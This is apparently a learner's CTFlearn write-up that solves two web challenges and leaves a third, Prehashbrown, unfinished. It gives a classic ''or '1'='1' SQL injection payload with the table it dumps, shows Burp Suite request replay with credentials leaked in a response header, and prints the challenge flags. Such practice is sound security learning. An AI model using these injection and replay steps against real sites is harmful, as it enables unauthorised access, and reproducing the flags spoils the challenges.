Web

# Easy Challeneges

## Basic SQL Injection 
Given this link https://web.ctflearn.com/web4/

### input:
```'or '1'='1 ```
### output: 
```  
Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: th4t_is_why_you_n33d_to_sanitiz3_inputs
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii 
```

### Flag:
``` 
CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
```

# Medium Challenges

## POST Practice
### Given:
```
These website requires authentication, via POST. However, it seems as if someone has defaced our site. Maybe these is still some way to authenticate? http://165.227.106.113/post.php
```
I used a proxy browser enabled by Burp Suite to intercept the requests. 

Intercepted the GET request obtained from the given link, http://165.227.106.113/post.php
### Output:
``` 
GET /post.php?+= HTTP/1.1
Host: 165.227.106.113
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

From here I also saw some credentials in the response header as ``` admin:71urlkufpsdnlkadsf ```
Next, I sent this captured GET request to Burp's Repeater and changed the request method to POST and then added the credentials to the request.

### Output: 
```
POST /post.php HTTP/1.1
Host: 165.227.106.113
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Authorization: Basic admin:71urlkufpsdnlkadsf
Connection: close
Cookie: PHPSESSID=l8b2286ifqdceh32ablttfpdu5
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

&username=admin&password=71urlkufpsdnlkadsf
```
The flag was found the response header after sending the POST request with the proper credentials.
```
HTTP/1.1 200 OK
Server: nginx/1.4.6 (Ubuntu)
Date: Sun, 09 Aug 2020 01:09:13 GMT
Content-Type: text/html
Connection: close
X-Powered-By: PHP/5.5.9-1ubuntu4.22
Content-Length: 32

<h1>flag{p0st_d4t4_4ll_d4y}</h1>
```
### Flag:
``` 
CTFlearn{p0st_d4t4_4ll_d4y}
```

## Prehashbrown
### Given:
```
I created a database of all known types of hashbrowns! Try to see if you can find a way to authenticate as an admin and retrieve the flag. Hashbrown Database - http://138.197.193.132:5000/login
```

To begin, register a new account from the main page you are redirected to from the given link.
In this case, I used the credentials as ``` test123:test123 ``` for this new account.
### Output:
``` 

```
### Flag:
``` 

```
